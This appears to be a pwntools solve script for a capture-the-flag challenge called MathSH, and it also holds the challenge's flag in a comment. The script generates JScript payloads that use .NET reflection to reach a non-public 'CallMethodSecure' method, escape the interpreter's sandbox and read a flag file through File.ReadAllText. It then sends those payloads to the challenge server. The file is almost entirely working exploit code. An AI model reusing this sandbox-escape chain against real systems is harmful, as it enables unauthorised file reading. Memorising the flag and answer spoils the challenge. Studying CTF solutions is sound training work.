#!/usr/bin/env python3
from pwn import *


def emit_null():
    return 'null'


def emit_bool(b):
    return 'true' if b else 'false'


def emit_string(expr):
    return '"' + expr.replace('"', '\\"') + '"'


def emit_eval(expr, target):
    return f'''eval({emit_string(expr)}, {target})'''


def emit_call(callable, *args):
    return f'''{callable}({', '.join(args)})'''


def emit_direct_method_call(object, method_name, *args):
    return emit_call(f'{object}.{method_name}', *args)


def emit_method_call(object, method_name, *args):
    return emit_eval(emit_call(method_name, *args), object)


def emit_field_access(object, field_name):
    return emit_eval(field_name, object)


def emit_type_delegator(name):
    return f'__global__.{name}'


def emit_type(name):
    return emit_field_access(emit_type_delegator(name), 'UnderlyingSystemType')


ENUM = emit_type_delegator('System.Enum')


def emit_enum_value(type, name):
    return emit_direct_method_call(ENUM, 'Parse', type, emit_string(name))


def emit_print(expr):
    return f'''memset({expr}, 0)'''


def emit_ctor(type, *args):
    return emit_call(type, *args)


def emit_array(*args):
    return emit_call('array', *args)


UTILS = emit_type_delegator('JScriptRunner.JScriptUtils')
ARG_TYPE_OBJECT = emit_string('')
ARG_TYPE_STRING = emit_string('')
ARG_TYPE_BOOL = emit_bool(False)
ARG_TYPE_ARRAY = emit_array()
ARG_TYPE_INT = '0'


def emit_utils_get_method(type, name, static_type, case_sensitive, non_public, arg_types):
    return emit_direct_method_call(
        UTILS,
        'GetMethod',
        type,
        emit_string(name),
        emit_bool(static_type),
        emit_bool(case_sensitive),
        emit_bool(non_public),
        emit_array(*arg_types),
    )


def emit_utils_call_method(method, target_object, args):
    return emit_direct_method_call(
        UTILS,
        'CallMethod',
        method,
        target_object,
        emit_array(*args),
    )


CALL_METHOD_SECURE = emit_utils_get_method(
    type=UTILS,
    name='CallMethodSecure',
    static_type=True,
    case_sensitive=False,
    non_public=True,
    arg_types=(ARG_TYPE_OBJECT, ARG_TYPE_STRING, ARG_TYPE_BOOL, ARG_TYPE_ARRAY),
)


def emit_utils_call_method_secure(target_object, name, *args):
    return emit_utils_call_method(
        method=CALL_METHOD_SECURE,
        target_object=emit_null(),
        args=(
            target_object,
            emit_string(name),
            emit_bool(False),  # case_sensitive
            emit_array(*args),
        ),
    )


def main():
    with remote('mathsh.2020.ctfcompetition.com', 1337) as tube:
        tube.recvuntil(b'MathSH> ')
        global_type = emit_type_delegator('JScriptRunner.JScriptGlobal')
        read_all_text_method = emit_utils_get_method(
            type=emit_type_delegator('System.IO.File'),
            name='ReadAllText',
            static_type=True,
            case_sensitive=False,
            non_public=False,
            arg_types=(ARG_TYPE_STRING,),
        )
        magic_delegate_type = emit_type('SlimlineJScript.ResolveValueFunc')
        create_delegate_method = emit_utils_get_method(
            type=emit_type_delegator('System.Delegate'),
            name='CreateDelegate',
            static_type=True,
            case_sensitive=False,
            non_public=False,
            arg_types=(
                magic_delegate_type,
                ARG_TYPE_STRING,
                read_all_text_method,
                ARG_TYPE_BOOL,
            ),
        )
        delegate = emit_utils_call_method_secure(
            emit_type('System.Delegate'),
            'CreateDelegate',
            magic_delegate_type,
            emit_string('c:\\\\ctf\\\\flag.txt'),
            read_all_text_method,
            emit_bool(True),
        )
        resolve_value = emit_ctor(
            emit_type_delegator('SlimlineJScript.ResolveValue'),
            delegate,
        )
        boom = emit_utils_get_method(
            global_type,
            '__flag__',
            static_type=False,
            case_sensitive=False,
            non_public=False,
            arg_types=(resolve_value,),
        )
        xxx = emit_print(boom)
        # idc right now, but to make this work, run nc manually
        # run __init__(true)
        # and use boom as the second command
        # CTF{C#_is_the_best_programming_language_change_my_mind}
        print('<< ' + xxx)
        tube.sendline(xxx)
        print('>> ' + tube.recvuntil(b'MathSH> ')[:-8].strip().decode())

        memlist = emit_call('memlist')
        print('<< ' + memlist)
        tube.sendline(memlist)
        print('>> ' + tube.recvuntil(b'MathSH> ')[:-8].strip().decode())

        flag = emit_call('__flag__')
        print('<< ' + flag)
        tube.sendline(flag)
        print('>> ' + tube.recvuntil(b'MathSH> ')[:-8].strip().decode())


if __name__ == '__main__':
    main()
